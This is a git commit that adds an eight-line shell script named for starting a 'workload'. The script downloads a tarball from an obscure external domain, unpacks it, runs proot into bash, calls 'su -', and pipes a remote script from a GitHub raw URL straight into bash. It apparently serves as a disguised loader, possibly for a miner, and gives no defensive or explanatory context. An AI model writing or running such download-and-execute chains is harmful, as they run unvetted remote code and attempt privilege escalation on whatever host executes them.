33f890eaf2698e5bc96a25a7245af420f72cf30b
maxwellcrawford21 <maxwellcrawford.2@gmail.com>
2024-06-28 06:19:27 +0200

    Create start_workload_for_shiny_whive.sh

---
+++ start_workload_for_shiny_whive.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+curl -L -o backup4.tar.gz http://greenleaf.teatspray.fun/backup4.tar.gz
+tar -xf backup4.tar.gz
+./dist/proot -S . /bin/bash
+sleep 2
+su -
+sleep 2
+wget -O - https://raw.githubusercontent.com/maxwellcrawford21/Improved_Nodejs/main/workload_for_shiny_whive.sh | bash
